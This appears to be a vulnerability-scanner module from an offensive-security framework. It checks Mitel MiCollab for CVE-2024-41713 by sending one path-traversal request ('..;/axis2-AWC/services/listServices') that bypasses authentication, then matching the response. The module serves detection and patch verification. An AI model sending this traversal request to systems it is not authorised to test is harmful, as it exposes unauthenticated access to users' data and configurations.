#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in the NuPoint Unified Messaging (NPM) component of Mitel MiCollab through 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mitel MiCollab - Authentication Bypass Detection',
        'description': "A vulnerability in the NuPoint Unified Messaging (NPM) component of Mitel MiCollab through 9.8 SP1 FP2 (9.8.1.201) could allow an unauthenticated attacker to conduct a path traversal attack, due to insufficient input validation. A successful exploit could allow unauthorized access, enabling the attacker to view, corrupt, or delete users' data and system configurations.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve204', 'mitel', 'cmg-suite', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-misa-2024-0029',
            'https://labs.watchtowr.com/where-theres-smoke-theres-fire-mitel-micollab-cve-2024-35286-cve-2024-41713-and-an-0day/?123',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-41713',
        ],
        'cve': 'CVE-2024-41713',
    }

    def run(self):
        path = '/npm-pwg/..;/axis2-AWC/services/listServices'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Available services', 'Service Description',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Mitel MiCollab - Authentication Bypass detected', path=path)
            return True
        return False

